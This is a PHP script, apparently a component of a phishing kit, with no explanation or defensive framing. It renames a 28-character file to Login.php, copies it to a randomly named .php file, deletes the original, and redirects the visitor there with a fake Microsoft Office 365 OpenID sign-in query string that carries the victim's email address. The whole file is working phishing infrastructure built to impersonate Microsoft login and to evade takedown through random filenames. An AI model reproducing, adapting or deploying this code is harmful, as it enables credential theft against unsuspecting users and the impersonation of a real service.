<?php
session_start();
?>
<?php
$email = $_GET['email'];
$dir =  getcwd();
if ($handle = opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
 $len = strlen($entry);
if($len == 28){
rename($entry, "Login.php");
}}}
$staticfile = "Login.php";
$name =  generateRandomString();
$secfile = $name.".php";
if (!copy($staticfile, $secfile)) {
//echo "file not create\n";
}else {
if(file_exists($secfile)){
//echo "file exist\n";
unlink($staticfile);
header("Location: $secfile??authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dix1bRYcZyTtsOJ4fCyynNPbx-oRiEqQskQTQSNWg-kKeLduC4WKeKd7dSA63bHx9bBL1TSHGQFKz22U15b0ywRBsXJawZtcL2xTgjhjoUUEt0gaqz51cEIoPcCqGWL5U&nonce=636725440919915654.ZjQ3NTc0MTEtMDEzNS00MDhjLWFiZTYtZjM3NjliZDgyZTUwYWUwMGI0YjgtZGZiMC00NmQxLWE3NmItZGM3ZWI5Zjk2ODIw&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&Email=$email");
}}

//echo $_SESSION["file"]."\n";
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
?>